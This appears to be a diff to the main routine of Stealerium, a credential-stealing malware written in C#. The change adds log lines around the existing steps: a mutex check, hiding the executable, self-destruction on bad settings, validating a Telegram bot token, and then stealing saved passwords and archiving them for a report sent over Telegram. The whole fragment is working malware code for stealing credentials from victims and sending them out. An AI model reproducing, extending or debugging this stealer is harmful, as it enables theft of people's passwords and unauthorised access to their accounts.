@@ -33,15 +33,18 @@ namespace Stealerium.Stub
             }
 
             // Mutex check (to avoid running multiple instances)
+            Logging.Log("Trying to check the mutex control");
             MutexControl.Check();
 
             // Initialize configuration
+            Logging.Log("Initializing config");
             Task.Run(Config.InitAsync).Wait();
 
             // Hide executable on first start
             if (!Startup.IsFromStartup())
                 Startup.HideFile();
 
+            Logging.Log("Checking telegram API and chat");
             // If Telegram API or ID is invalid, self-destruct
             if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
             {
@@ -56,6 +59,7 @@ namespace Stealerium.Stub
             // Change working directory to appdata
             Directory.SetCurrentDirectory(Paths.InitWorkDir());
 
+            Logging.Log("Checking Telegram Token");
             // Test Telegram API token
             if (!await Telegram.TokenIsValidAsync().ConfigureAwait(false))
             {
@@ -63,6 +67,7 @@ namespace Stealerium.Stub
                 SelfDestruct.Melt();
             }
 
+            Logging.Log("Stealing passwords and sending a report");
             // Steal passwords and send the report
             var passwords = await Passwords.SaveAsync();
             var archive = Filemanager.CreateArchive(passwords);
